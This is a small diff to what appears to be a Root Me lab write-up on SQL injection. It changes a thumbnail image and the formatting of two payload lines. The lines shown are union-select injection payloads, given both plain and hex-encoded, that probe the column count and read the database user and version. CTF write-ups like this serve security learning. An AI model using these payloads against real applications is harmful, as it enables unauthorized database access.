@@ -4,7 +4,7 @@ tags:
     - Lab
     - Root Me
 date: "2024-06-22"
-thumbnail: "/assets/img/thumbnail/rootme.png"
+thumbnail: "/assets/img/thumbnail/sqli.jpg"
 bookmark: true
 ---
 ## Description
@@ -90,7 +90,7 @@ payload
 ```sql
  ' union select ' order by 3 -- - -- - 
 
-payload after hexed : ` ' union select 0x27206f726465722062792033202d2d202d -- -`
+payload after hexed : ' union select 0x27206f726465722062792033202d2d202d -- -
 ```
 <img src="/assets/img/rootme/routed/7.png" alt="orderby">
 
@@ -102,7 +102,7 @@ Payload
 ```sql
 ' union select ' union select current_user(),@@version -- - -- -
 
-after hex encode: `' union select 0x2720756e696f6e2073656c6563742063757272656e745f7573657228292c404076657273696f6e202d2d202d -- -`
+after hex encode: ' union select 0x2720756e696f6e2073656c6563742063757272656e745f7573657228292c404076657273696f6e202d2d202d -- -
 ```
 
 <img src="/assets/img/rootme/routed/8.png" alt="version">
